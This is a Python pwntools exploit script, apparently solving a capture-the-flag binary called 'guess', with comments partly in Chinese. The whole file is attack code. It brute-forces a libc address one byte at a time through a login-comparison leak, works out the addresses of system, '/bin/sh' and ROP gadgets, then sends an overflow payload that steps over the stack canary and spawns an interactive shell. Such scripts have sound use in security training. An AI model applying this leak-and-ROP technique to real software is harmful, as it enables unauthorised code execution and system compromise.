from pwn import *

# start the program
io = process('./guess')

# get context
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# get the address of stderr in libc
# 通过循环暴力枚举
stderr_addr = 0                 
stderr_addr_shadow = b''        # 用于存储已经猜对的字节
for i in range(6):              # 实际上地址只需要 48位（6 Byte），高位补0即可
    for j in range(1, 256):     # 枚举 0x00 ~ 0xff ASCII码
        # choice
        io.sendlineafter(b'Choice:', b'1')  # 接收到 `Choice:` 之后，发送 `1` 并换行

        # login
        account = password = b'A' * 16  # 先填充前16个字节
        account = account + stderr_addr_shadow + bytes([j])
        io.sendafter(b'Account:', account)
        io.sendafter(b'Password:', password)
        ret = io.recvuntil(b'l')        # 接收到 `l` 之后，停止接收
        if (ret != b' Login fail'):     # 登录成功，说明 account后半段和对应内存相同，libc 猜对了
            stderr_addr = j * (256 ** i) + stderr_addr
            stderr_addr_shadow += bytes([j])
            io.sendlineafter(b'comments:', b'A')
            break

print("stderr_addr: ", hex(stderr_addr))

# the distance between read_buf(v1) and ret_addr
dis = 0x58

# get the base address of libc

system_addr = stderr_addr - 0x00007f4edf96c5c0 + 0x7f4edf7d1290
# print("system_addr: ", hex(system_addr))

shellcode_addr = system_addr - libc.symbols["system"] + next(libc.search(b'/bin/sh'))
# print("shellcode_addr: ", hex(shellcode_addr))

# gadget1: pop rdi; ret
gadget1_addr = system_addr - libc.symbols["system"] + 0x23b6a
# print("gadget1_addr: ", hex(gadget1_addr))

# gadget2: ret
gadget2_addr = system_addr - libc.symbols["system"] + 0x22679
# print("gadget2_addr: ", hex(gadget2_addr))

# launch the bash
io.sendlineafter(b'Choice:', b'1')
io.sendafter(b'Account:', b'A\x00')
io.sendafter(b'Password:', b'A\x00')

# We modify v1 in sub_91A at last(v1 is what we input after welcome)
# skip the canary
payload = b'C' * 64 + bytes([dis - 1]) + p64(gadget1_addr) + p64(shellcode_addr) + p64(gadget2_addr) + p64(system_addr) + b'\x0a'
print("payload: ", payload)

io.sendafter(b'comments:', payload)

# 进入交互模式，把输入输出交给终端
io.interactive()